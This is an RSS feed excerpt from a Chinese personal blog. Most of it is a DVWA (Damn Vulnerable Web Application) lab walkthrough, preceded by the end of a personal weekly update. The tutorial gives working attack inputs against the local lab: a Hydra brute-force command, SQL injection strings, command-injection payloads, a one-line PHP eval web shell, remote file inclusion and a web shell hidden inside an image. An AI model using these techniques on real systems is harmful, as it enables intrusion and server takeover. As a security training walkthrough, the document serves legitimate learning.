&lt;p&gt;部署地址在这里：&lt;a href=&quot;https://auth.skywt.cn&quot;&gt;auth.skywt.cn&lt;/a&gt;。现在，我自部署的 &lt;a href=&quot;https://memos.skywt.cn&quot;&gt;Memos&lt;/a&gt;、&lt;a href=&quot;https://cloud.skywt.cn&quot;&gt;Nextcloud&lt;/a&gt;、&lt;a href=&quot;https://drive.skywt.cn&quot;&gt;Cloudreve&lt;/a&gt;、&lt;a href=&quot;https://vpn.skywt.cn&quot;&gt;Headscale&lt;/a&gt; 等等服务都已经配置接入了 SSO，可以用统一的账号登录。之后开发需要用户登录功能的软件，也可以「外包出去」了。&lt;/p&gt;
&lt;p&gt;很喜欢这种「大一统」的感觉。😁&lt;/p&gt;
&lt;h2&gt;⌚️ 触发了 Apple Watch 摔倒检测 😅&lt;/h2&gt;
&lt;p&gt;本周三，在骑共享单车经过信息院门口的时候，路边有一道高约 5cm 的路沿。我打算骑车冲上路沿，但是车的前进方向和路沿的夹角过小。于是自行车发生了侧翻……（不过只是膝盖擦破了一点皮，没啥事）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这居然触发了 Apple Watch 的摔倒检测。&lt;/strong&gt;这是我第一次真正体验这个功能。自行车侧翻之后我在地上坐了一会，经过了大概十多秒，手表提示「你似乎摔得很厉害」，显示了一个 SOS 滑块和一个「我没事」按钮。如果一定时间没有响应，手表就会帮我紧急呼救。&lt;/p&gt;
&lt;p&gt;点击「我没事」按钮，会给出进一步的选项：「我摔倒了，但是没事」或者「我没有摔倒」。选择前者之后，此次摔倒会记入健康 App，通过统计图表展示……&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1824891469.jpg&quot; data-fancybox data-caption=&quot;Apple 健康 App 中的摔倒次数&quot;&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1824891469.jpg&quot; alt=&quot;Apple 健康 App 中的摔倒次数&quot; style=&quot;width:60%;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;希望大家体验不到这个功能 😇。&lt;/p&gt;
&lt;h2&gt;✨ 博客系统更新日志&lt;/h2&gt;
&lt;p&gt;自从 4 月 19 日起，我上线了自己开发的博客后端。现在，这个 skywt.cn 使用的博客系统已经完全脱离了 Typecho。&lt;/p&gt;
&lt;p&gt;（不过，还没有做内容管理相关的 API，所以现在发文章和管理评论都是直接去数据库里用 SQL……）&lt;/p&gt;
&lt;p&gt;后续会将 blog.skywt.cn 这个旧的博客完全重定向到新的博客，包括 RSS 地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Typecho，感谢你陪我走过的路。再见啦。&lt;/strong&gt;&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>DVWA 通关教程</title><link>https://skywt.cn/blog/dvwa-tutorial/</link><guid isPermaLink="true">https://skywt.cn/blog/dvwa-tutorial/</guid><description>**DVWA**（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（[GitHub 仓库](https://github.com/digininja/DVWA)）

DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：

* **Low**：完全没有安全措施。
* **Medium**：不良的安全实践。
* **High**：（或许更难攻击的）不良安全实践。
* **Impossible**：安全的实践。

</description><pubDate>Wed, 08 May 2024 07:30:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;strong&gt;DVWA&lt;/strong&gt;（Damn Vulnerable Web Application，该死的易受攻击的 Web 应用）是一个用于 Web 渗透测试的靶场。这一项目基于 PHP，提供了多个常见的 Web 漏洞的经典实现，非常适合 Web 安全入门实践。（&lt;a href=&quot;https://github.com/digininja/DVWA&quot;&gt;GitHub 仓库&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;DVWA 的每个漏洞（vulnerability）分为四个安全等级（也代表攻击难度）：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Low&lt;/strong&gt;：完全没有安全措施。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Medium&lt;/strong&gt;：不良的安全实践。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;High&lt;/strong&gt;：（或许更难攻击的）不良安全实践。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Impossible&lt;/strong&gt;：安全的实践。&lt;/li&gt;
&lt;/ul&gt;
&lt;!--more--&gt;
&lt;h2&gt;环境配置&lt;/h2&gt;
&lt;p&gt;我的运行环境是 macOS。接下来，我们使用 Docker 部署实验环境。&lt;/p&gt;
&lt;h3&gt;使用 Docker Compose 搭建环境&lt;/h3&gt;
&lt;p&gt;这个项目的 GitHub 上&lt;a href=&quot;https://github.com/digininja/DVWA/pkgs/container/dvwa&quot;&gt;预构建的镜像&lt;/a&gt;，都是 linux/amd64 平台，不方便在我 macOS 的 linux/arm64/v8 平台下运行（或许要通过 Rosetta）。因此，我们选择克隆代码仓库，在本地构建镜像。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone git@github.com:digininja/DVWA.git
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;仓库中其实已经包含了 &lt;code&gt;compose.yml&lt;/code&gt; 文件，不过为了满足自己的需求，我还是重新写了一个 compose 文件。&lt;/p&gt;
&lt;p&gt;除了 MySQL（MariaDB）数据库以外，为了方便起见，再部署一个 phpMyAdmin 来查看和管理数据库内容（毕竟干啥都要写 SQL 太不直观了）。最终 &lt;code&gt;compose.yml&lt;/code&gt; 文件如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;version: “3”

services:
  dvwa:
    build: .
    environment:
      - DB_SERVER=mariadb
    depends_on:
      - mariadb
    volumes:
      - config:/var/www/html/config
    networks:
      - dvwa
    ports:
      - &amp;quot;127.0.0.1:80:80&amp;quot;
    restart: unless-stopped
  mariadb:
    image: mariadb:11.3.2
    environment:
      - MARIADB_ROOT_PASSWORD=v556jYVdMsVp5rox
      - MARIADB_DATABASE=dvwa
      - MARIADB_USER=dvwa
      - MARIADB_PASSWORD=p@ssw0rd
    volumes:
      - database:/var/lib/mysql
    networks:
      - dvwa
    restart: unless-stopped
  phpmyadmin:
    image: phpmyadmin:5.2.1
    environment:
      - PMA_HOST=mariadb
    depends_on:
      - mariadb
    networks:
      - dvwa
    ports:
      - &amp;quot;127.0.0.1:8080:80&amp;quot;
    restart: unless-stopped

networks:
  dvwa:

volumes:
  config:
  database:
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;💡 提示：自己构建镜像是更好的选择。&lt;/strong&gt;网上很多使用 Docker 部署 DVWA 的文章，使用 DockerHub 上 &lt;code&gt;vulnerables/web-dvwa&lt;/code&gt; 这个镜像。这个镜像最近的更新日期已经是五年前了，不推荐使用。相比之下，自己从官方的 repo 里构建是更好的选择。&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;docker compose up -d&lt;/code&gt; 就能构建容器并启动。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Running 3/6
 ⠦ Network dvwa_dvwa            Created                              0.6s 
 ⠦ Volume &amp;quot;dvwa_config&amp;quot;         Created                              0.5s 
 ⠦ Volume &amp;quot;dvwa_database&amp;quot;       Created                              0.5s 
 ✔ Container dvwa-mariadb-1     Started                              0.3s 
 ✔ Container dvwa-phpmyadmin-1  Started                              0.5s 
 ✔ Container dvwa-dvwa-1        Started                              0.5s 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;⚠️ 注意：在开启之前，检查系统端口占用情况。&lt;/strong&gt;macOS 默认会安装 httpd，这个服务可能会被某些软件（疑似 Tailscale）开启，占用 80 端口。即使容器跑起来之后，访问 &lt;code&gt;localhost&lt;/code&gt; 只能看到莫名其妙的一行「It works! 」提示。这种情况下，要么关闭 httpd，要么更改容器映射的端口。&lt;/p&gt;
&lt;p&gt;现在，访问 &lt;code&gt;localhost&lt;/code&gt;，能看到 DVWA 的登录页面，这代表服务成功跑起来了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1185019003.png&quot; alt=&quot;DVWA 登录页面&quot;&gt;&lt;/p&gt;
&lt;p&gt;此时还没创建数据库，可以访问 &lt;code&gt;localhost/setup.php&lt;/code&gt; 进行初始化检查，并创建数据库：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/2381126624.png&quot; alt=&quot;DVWA Setup 页面&quot;&gt;&lt;/p&gt;
&lt;p&gt;可以看到所有 PHP 相关的配置都默认 OK 了，无需我们手动调整。这就是使用 Docker 部署的好处。&lt;/p&gt;
&lt;p&gt;创建数据库后，回到登录页面，使用默认用户名 &lt;code&gt;admin&lt;/code&gt; 和默认密码 &lt;code&gt;password&lt;/code&gt; 即可登录。&lt;/p&gt;
&lt;p&gt;此外，访问 &lt;code&gt;localhost:8080&lt;/code&gt;，可以看到 phpMyAdmin 的登录页面。使用 root 用户登录，即可方便地查看、编辑数据库。&lt;/p&gt;
&lt;h3&gt;配置 reCAPTCHA&lt;/h3&gt;
&lt;p&gt;DVWA 包含 Insecure CAPTCHA 这个实验，要用到 Google 的 reCAPTCHA。这是一种机器人检测工具，就是「给一堆图片让我们选出其中的摩托车」这类的验证器。&lt;/p&gt;
&lt;p&gt;为了使用 Google reCAPTCHA，我们需要在&lt;a href=&quot;https://www.google.com/recaptcha/admin/create&quot;&gt;这个页面&lt;/a&gt;注册一个新的站点，申请 public key 和 private key：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/1012265525.png&quot; alt=&quot;DVWA 申请页面&quot;&gt;&lt;/p&gt;
&lt;p&gt;「reCAPTCHA type」其实是要选择版本，v2 版本是要对用户请求发起质询的，v3 版本则是在使用时根据用户行为打分。建议选择 v2 的「&amp;quot;I&apos;m not a robot&amp;quot; Checkbox」版本，这个版本最直观。别忘了在下面的「Domains」里加入 &lt;code&gt;localhost&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;提交之后会得到 public key 和 private key，需要将这两个 key 填入 DVWA 的配置文件。刚才在 compose 文件中我们已经将配置文件目录挂载到名为 &lt;code&gt;config&lt;/code&gt; 的 volume 中，只要找到其中的 &lt;code&gt;config.inc.php&lt;/code&gt; 并填写即可。&lt;/p&gt;
&lt;p&gt;由于众所周知的原因，reCAPTCHA 的默认服务器在国内无法访问，而我们的容器中的 PHP 进程需要访问其服务器才能验证 reCAPTCHA。解决方案是将 www.google.com 替换成不用代理即可访问的镜像站 www.recaptcha.net。需要修改的是 &lt;code&gt;/var/www/html/external/recaptcha/recaptchalib.php&lt;/code&gt; 中的 url 变量。&lt;/p&gt;
&lt;p&gt;配置完成后，打开 Insecure CAPTCHA 这一关进行测试，在 impossible 难度下能够正常修改密码，就代表配置成功。&lt;/p&gt;
&lt;h2&gt;Brute Force&lt;/h2&gt;
&lt;p&gt;这一关提供了一个简单的登录场景。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;通过脚本结合字典爆破出密码。&lt;/p&gt;
&lt;p&gt;事实上，这个登录表单和 DVWA 程序登录表单用的是同一个数据表，所以登录组合之一是 &lt;code&gt;admin&lt;/code&gt; 和 &lt;code&gt;password&lt;/code&gt;。在表中，还有若干其他用户。&lt;/p&gt;
&lt;h3&gt;Low：简单暴力&lt;/h3&gt;
&lt;p&gt;这一级别没有任何防御。并且有个非常逆天的设计：&lt;strong&gt;使用 GET 请求明文提交表单&lt;/strong&gt;。测试使用 testuser 和 testpass 登录，发现 URL 直接变成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/brute/?username=testuser&amp;amp;password=testpass&amp;amp;Login=Login#
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以自己写 shell 脚本爆破，也可以用 Hydra 工具爆破。注意：发请求的时候，要带上 cookie，否则 DVWA 程序会要求你登录。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hydra -f -L ./Usernames/top-usernames-shortlist.txt -P ./Passwords/2020-200_most_used_passwords.txt -v localhost http-get-form &amp;quot;/vulnerabilities/brute/:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:F=incorrect:H=Cookie\: security=low; PHPSESSID=0lc3tfkicmfiebe1og7vqej77q&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;也可以用 BurpSuite Intruder。在「Options」、「Grep - Match」里添加「incorrect」关键词，方便识别得到的结果是否成功。&lt;/p&gt;
&lt;p&gt;或者也可以用所谓的「万能密码」，也就是 SQL 注入，用户名写 &lt;code&gt;admin&apos;;#&lt;/code&gt;  甚至 &lt;code&gt;&apos; OR 1 = 1 LIMIT 1;#&lt;/code&gt; 就行。当然这个考点就不是 Brute Force 了。&lt;/p&gt;
&lt;h3&gt;Medium：等待时间&lt;/h3&gt;
&lt;p&gt;和 low 的区别在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对用户名、密码字符串做了转义（不能 SQL 注入了）。&lt;/li&gt;
&lt;li&gt;如果错误，需要等待 2 秒才会返回结果。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同样用 Hydra 或者 BurpSuite Intruder，用和上面一样的方法，可以完成爆破，只是比 low 要慢一些。&lt;/p&gt;
&lt;p&gt;事实上，可以假设在网络延迟正常的情况下，如果密码正确，返回结果时间一般不会慢于 0.5 秒（这个阈值可以根据网络延迟调整）。所以，当一次尝试等待时间超过了 0.5 秒，可以直接认为密码错误而停止等待。这样可以节省不少时间。&lt;/p&gt;
&lt;h3&gt;High：随机等待时间 &amp;amp; CSRF 防护&lt;/h3&gt;
&lt;p&gt;和 medium 的区别在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果密码错误，等待随机 0～3 秒才返回。&lt;/li&gt;
&lt;li&gt;表单中增加了隐藏的 input 组件 &lt;code&gt;user_token&lt;/code&gt;，值为每次随机的字符串，用于防止 CSRF 攻击。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;添加了 token 只是略微增加了我们爆破的复杂性：每一个登录请求都必须对应一个对表单的请求。可以使用 BurpSuite 的「Grep - Extract」功能提取 token，用 Pitchfork 模式逐一尝试。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/3106872127.png&quot; alt=&quot;截屏2022-08-03 17.44.14.png&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Impossible：账户锁定&lt;/h3&gt;
&lt;p&gt;在 high 的基础上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 POST 提交表单。&lt;/li&gt;
&lt;li&gt;在后端（数据库中）记录了&lt;strong&gt;用户尝试错误的次数、上次登录时间&lt;/strong&gt;，如果连续三次密码错误，账户锁定 15 分钟。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有了尝试三次账户锁定，暴力就基本上无法快速爆破特定账户了。&lt;/p&gt;
&lt;h2&gt;Command Injection&lt;/h2&gt;
&lt;p&gt;这一关可以视为 Remote Code Execution（RCE）攻击的一个应用。提供的场景是：提供一个表单，接收用户输入的 IP 地址，在服务器上使用 PHP 的 &lt;code&gt;exec()&lt;/code&gt; 执行 ping 命令，并返回输出的结果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;在服务器上执行任意我们想要的命令。&lt;/p&gt;
&lt;h3&gt;Low：不过滤&lt;/h3&gt;
&lt;p&gt;在后端直接将 &lt;code&gt;ping&lt;/code&gt; 命令拼接上我们输入的字符串，然后执行。那么，用 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 或者 &lt;code&gt;;&lt;/code&gt; 就可以结束之前的命令，添加任意命令。比如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1; ls -al
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Medium：简单过滤&lt;/h3&gt;
&lt;p&gt;在 low 的基础上，做了 &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; 和 &lt;code&gt;;&lt;/code&gt; 的检测，在字符串中将它们删除。&lt;/p&gt;
&lt;p&gt;能够做命令注入的不止上面两种字符，还可以用管道符 &lt;code&gt;|&lt;/code&gt;。这个符号本来的用法是将上一个命令的输出作为下一个命令的输入。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1 | ls -al
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;High：更多过滤&lt;/h3&gt;
&lt;p&gt;替换了不少字符：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;    // Set blacklist
    $substitutions = array(
        &apos;&amp;amp;&apos;  =&amp;gt; &apos;&apos;,
        &apos;;&apos;  =&amp;gt; &apos;&apos;,
        &apos;| &apos; =&amp;gt; &apos;&apos;,
        &apos;-&apos;  =&amp;gt; &apos;&apos;,
        &apos;$&apos;  =&amp;gt; &apos;&apos;,
        &apos;(&apos;  =&amp;gt; &apos;&apos;,
        &apos;)&apos;  =&amp;gt; &apos;&apos;,
        &apos;`&apos;  =&amp;gt; &apos;&apos;,
        &apos;||&apos; =&amp;gt; &apos;&apos;,
    ); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;仔细观察，过滤的不是管道符这个字符，而是管道符加一个空格……所以用 &lt;code&gt;127.0.0.1 |ls&lt;/code&gt; 这种还是可以的。&lt;/p&gt;
&lt;p&gt;并且没有过滤换行（&lt;code&gt;%0a&lt;/code&gt;）、回车（&lt;code&gt;%0d&lt;/code&gt;），这二者同样可以达到分隔多条命令的效果。当然，前端的输入框里无法输入换行，需要用别的工具发请求，将 ip 写为 &lt;code&gt;127.0.0.1%0als&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;High 过滤了减号 &lt;code&gt;-&lt;/code&gt;，所以无法处理带参数的命令。&lt;/p&gt;
&lt;h3&gt;Impossible：白名单&lt;/h3&gt;
&lt;p&gt;「白名单」永远比「黑名单」安全。这个等级直接判断输入的 IP 是否符合 IPv4 格式，并且也引入了 CSRF 攻击防护。&lt;/p&gt;
&lt;h2&gt;Cross Site Request Forgery (CSRF)&lt;/h2&gt;
&lt;p&gt;这一关提供了一个修改密码的表单，要求输入新的密码并确认，提交后就能修改密码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;在受害者不知情的情况下，使受害者更改密码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;⚠️ 注意：&lt;/strong&gt;现代浏览器基本都已经禁止第三方 Cookie，这意味着无论如何配置，当发送跨域请求时都不能携带 Cookie，&lt;strong&gt;这一漏洞已经无法利用&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;以下介绍的仅为在允许第三方 Cookie 的情况下，理论利用方式。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;没有防范 CSRF 攻击的检测，并且通过 GET 请求发数据。只要攻击者诱导受害者打开一个 URL，或者向这个 URL 发送请求，就可以修改密码。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/csrf/?password_new=123456&amp;amp;password_conf=123456&amp;amp;Change=Change#
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Medium：判断 referer&lt;/h3&gt;
&lt;p&gt;这一等级在收到请求后，判断 HTTP referer 请求头的内容是否包含当前服务器域名。&lt;/p&gt;
&lt;p&gt;然而，使用的是 &lt;code&gt;stripos&lt;/code&gt; 函数，即单纯的子串检测。假设 DVWA 运行在 &lt;code&gt;dvwa.com&lt;/code&gt;，那么只要 referer 包含这个子串即可。例如从 &lt;code&gt;skywt.cn&lt;/code&gt; 发起攻击，一种简单的方式是：&lt;code&gt;https://skywt.cn/?a=dvwa.com&lt;/code&gt;。&lt;/p&gt;
&lt;h3&gt;High：CSRF token&lt;/h3&gt;
&lt;p&gt;这一等级加入了 CSRF token，当用户加载表单时，表单内包含一个 hidden input，其中包含每次不同的 token；当提交时需要带上这个 token。&lt;/p&gt;
&lt;p&gt;这大大增加了攻击难度：恶意脚本需要使用用户的凭证先发送请求，获取页面上的 token，再将 token 一并发送，请求修改密码。&lt;/p&gt;
&lt;h3&gt;Impossible：提供原密码&lt;/h3&gt;
&lt;p&gt;这一等级要求在修改密码请求中提供用户的原密码。攻击者无法得知用户的原密码，所以无法使用 CSRF 攻击。&lt;/p&gt;
&lt;h2&gt;File Inclusion&lt;/h2&gt;
&lt;p&gt;这一关提供的页面，在 URL 中指定参数 &lt;code&gt;page&lt;/code&gt; 即可包含指定的页面。情境的本意是只能包含 file1、file2、file3 三个页面之一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;包含木马页面，执行我们想要的代码。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;直接可以进行任意文件包含，因为 URL 里可以任意引用文件，为所欲为。&lt;/p&gt;
&lt;p&gt;例如，在服务器 skywt.cn 上放一个一句话木马 &lt;code&gt;yjh.txt&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php eval($_GET[&apos;a&apos;]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这行 PHP 代码拿到 GET 请求传入的 a 参数，然后作为代码执行。通过这一代码，我们可以执行任何代码。这就是「一句话木马」。&lt;/p&gt;
&lt;p&gt;接下来，访问：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot;&gt;http://localhost/vulnerabilities/fi/?page=https://skywt.cn/yjh.txt&amp;amp;a=phpinfo();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;页面包含了我们的 &lt;code&gt;yjh.txt&lt;/code&gt;，传入的 &lt;code&gt;phpinfo()&lt;/code&gt;; 就会被执行，显示 PHP 信息。照此原理，能够执行任何 PHP 代码。&lt;/p&gt;
&lt;p&gt;利用 PHP 的 &lt;code&gt;exec()&lt;/code&gt; 函数，事实上相当于已经拿到了系统的 shell。&lt;/p&gt;
&lt;h3&gt;Medium：关键词过滤&lt;/h3&gt;
&lt;p&gt;对传入的 page 参数过滤了 &lt;code&gt;http://&lt;/code&gt;、&lt;code&gt;https://&lt;/code&gt;、&lt;code&gt;../&lt;/code&gt;、&lt;code&gt;..\&lt;/code&gt; 这几个关键词。&lt;/p&gt;
&lt;p&gt;PHP 的 &lt;code&gt;str_replace&lt;/code&gt; 函数只会进行「一次替换」，也就是将一个字符串中所有子串 A 进行替换，至于替换之后得到的新字符串是否包含子串 A，它并不关心。利用这个缺陷，我们可以使用「双写」的办法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-plaintext&quot;&gt;http://localhost/vulnerabilities/fi/?page=httpshttps://://skywt.cn/yjh.txt&amp;amp;a=phpinfo();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（也可以结合下一关的文件上传，使其引用本地的木马文件，即 URL 不包含 &lt;code&gt;http(s)://&lt;/code&gt; 协议。&lt;/p&gt;
&lt;h3&gt;High：只能是文件&lt;/h3&gt;
&lt;p&gt;限制了传入的 page 参数必须以 file 开头。本意是限制只能引用诸如 &lt;code&gt;file1.php&lt;/code&gt; 这样的文件，然而事实上可以用 &lt;code&gt;file://&lt;/code&gt; 协议引用本地的任何文件。&lt;/p&gt;
&lt;p&gt;需要结合下一关的文件上传漏洞，先上传一句话木马到本地，再引用。下文详述。&lt;/p&gt;
&lt;h3&gt;Impossible：白名单&lt;/h3&gt;
&lt;p&gt;使用「白名单」，限制只能访问 file1、file2、file3 这三个 PHP 文件。&lt;/p&gt;
&lt;h2&gt;File Upload&lt;/h2&gt;
&lt;p&gt;这一关提供了一个表单，能在其中选择一个文件并上传。情境的本意是只能上传图片文件，但是由于不佳的实现，导致能够上传 PHP 脚本木马。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;上传 PHP 木马并执行我们想要的代码。&lt;/p&gt;
&lt;h3&gt;Low：无防护&lt;/h3&gt;
&lt;p&gt;没有任何检测，直接将上传的文件保存并移动到某个特定的目录。&lt;/p&gt;
&lt;p&gt;上传之前提到的一句话木马 &lt;code&gt;yjh.php&lt;/code&gt; 就行。在这个 URL 里，能够利用木马：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/hackable/uploads/yjh.php?a=phpinfo();
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Medium：限制 MIME&lt;/h3&gt;
&lt;p&gt;只限制请求的 MIME 为 &lt;code&gt;image/jpeg&lt;/code&gt; 或者 &lt;code&gt;image/png&lt;/code&gt;，并不实际检测上传的内容。&lt;/p&gt;
&lt;p&gt;可以仍然上传这个 PHP 文件，只要在上传的请求中修改一下 Content-Type 就行了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/05/4042635291.png&quot; alt=&quot;截屏2022-08-05 12.11.55.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;也可以在真实的图片文件后加 PHP 一句话木马再上传。下文 high 中详述。&lt;/p&gt;
&lt;h3&gt;High：限制文件拓展名&lt;/h3&gt;
&lt;p&gt;相比 medium，这个等级：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 &lt;code&gt;getimagesize&lt;/code&gt; 函数获取图像内容实际大小，如果是 0 则拒绝上传。&lt;/li&gt;
&lt;li&gt;检测文件拓展名是否是 &lt;code&gt;jpg&lt;/code&gt;、&lt;code&gt;jpeg&lt;/code&gt;、&lt;code&gt;png&lt;/code&gt; 三者之一。如果不是则拒绝上传。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一个限制意味着，直接上传只包含一行 PHP 代码的一句话木马无法成功，必须上传一张真实的图片。我们可以用文本编辑器在一张真实的图片最后加上一句话木马。PHP 的特性是只会将 &lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt; 或 &lt;code&gt;&amp;lt;? ?&amp;gt;&lt;/code&gt; 中的内容视为脚本并运行，在这个之外的内容都会不解析而是直接显示。注意：使用这种方法，需要确保这个图片文件中，在我们插入的代码之前，没有出现过 &lt;code&gt;&amp;lt;?&lt;/code&gt; 这样的符号，否则在执行到我们的代码之前 PHP 就会抛出语法错误。&lt;/p&gt;
&lt;p&gt;如果使用日常的图片，生成 &lt;code&gt;&amp;lt;?&lt;/code&gt; 组合其实概率不低。我们可以生成一张最小的图片，确保不包含 &lt;code&gt;&amp;lt;?&lt;/code&gt; 组合：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;convert -size 1x1 xc:black yjh.jpg
echo &amp;quot;&amp;lt;?php eval(\$_GET[&apos;a&apos;]);?&amp;gt;&amp;quot; &amp;gt;&amp;gt; yjh.jpg
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;上传这个图片文件，能够规避第一条规则的检测。&lt;/p&gt;
&lt;p&gt;第二个限制，并不好解决。一般来说，像 Nginx 之类的 WebServer，PHP 环境的配置方式都是：对于服务器上以 &lt;code&gt;.php&lt;/code&gt; 结尾的文件，交由 PHP 的引擎执行脚本；对于其他拓展名的文件，则直接视为静态资源呈现。这样，如果文件结尾不是 &lt;code&gt;.php&lt;/code&gt;，我们无法将其单独作为 PHP 来执行。&lt;/p&gt;
&lt;p&gt;所以，这一关要结合上一关的文件包含漏洞。成功上传包含一句话木马的 &lt;code&gt;yjh.jpg&lt;/code&gt; 之后，只要利用 &lt;code&gt;file://&lt;/code&gt; 协议，访问这个 URL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/yjh.jpg&amp;amp;a=phpinfo();
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Impossible：图片重新编码&lt;/h3&gt;
&lt;p&gt;相比之前的等级，该等级加入了更加复杂的检测：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;检测 MIME 类型、拓展名。&lt;/li&gt;
&lt;li&gt;对图片去除元信息、重新编码再上传。这样图片中不可能包含任何其他东西。&lt;/li&gt;
&lt;li&gt;CSRF 防护。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Insecure CAPTCHA&lt;/h2&gt;
&lt;p&gt;这一关提供修改密码的场景，表单里提供了一个密码输入框、密码确认框，以及一个 reCAPTCHA 验证组件。期望的场景是：通过验证，才能提交修改密码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者的目标是：&lt;/strong&gt;不经过 reCAPTCHA 的验证也能实现修改密码。&lt;/p&gt;
&lt;h3&gt;Low：没用的 step 验证&lt;/h3&gt;
&lt;p&gt;这个 low 的实现真的很逆天，表单里有一个 hidden input 名为 &lt;code&gt;step&lt;/code&gt;，初始 value 为 1。当为 1 时提交，验证 reCAPTCHA，如果通过则&lt;strong&gt;重新打开页面&lt;/strong&gt;并将 &lt;code&gt;step&lt;/code&gt; 改为 2。当为 2 时提交，则不验证 reCAPTCHA 直接修改密码。&lt;/p&gt;
&lt;p&gt;那么，直接在页面里将 &lt;code&gt;step&lt;/code&gt; 改为 2 再提交就好了。&lt;/p&gt;
&lt;h3&gt;Medium：又一个没用的验证&lt;/h3&gt;
